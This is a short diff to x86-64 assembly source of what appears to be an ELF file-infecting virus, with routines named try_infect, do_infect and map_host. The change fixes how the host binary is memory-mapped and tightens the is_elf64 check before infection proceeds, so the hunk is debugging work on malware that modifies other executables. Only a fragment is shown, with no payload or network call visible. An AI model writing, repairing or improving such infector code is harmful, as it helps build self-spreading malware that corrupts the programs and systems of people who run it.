@@ -289,13 +289,15 @@ try_infect:
     cmp rsi, Elf64_Ehdr_size + Elf64_Phdr_size + STUB_SIZE
     jl .close
 
+    mov rdi, rsi
     call map_host
     mov data(host_bytes), rax
     mov rdi, rax
 
     call is_elf64
-    test rax, rax
-    jz .unmap
+    cmp rax, TRUE
+    jne .unmap
+
     call do_infect
 
     .unmap:
@@ -393,9 +395,10 @@ do_infect:
         pop r13
         ret
 
-; void *map_host(rdi=callback*)
+; void *map_host(rdi=len, rsi=callback)
 map_host:
-    push rdi
+    push rsi
+    mov rsi, rdi
     xor r9, r9
     mov r8, data(host_fd)
     mov r10, MAP_SHARED
@@ -404,12 +407,12 @@ map_host:
     mov rax, SYS_MMAP
     syscall
 
-    pop rdi
+    pop rsi
     cmp rax, MAP_ERROR
     jae .error
     ret
     .error:
-        jmp rdi
+        jmp rsi
 
 ; void *get_base_address()
 ; Gets the base address of the running process.
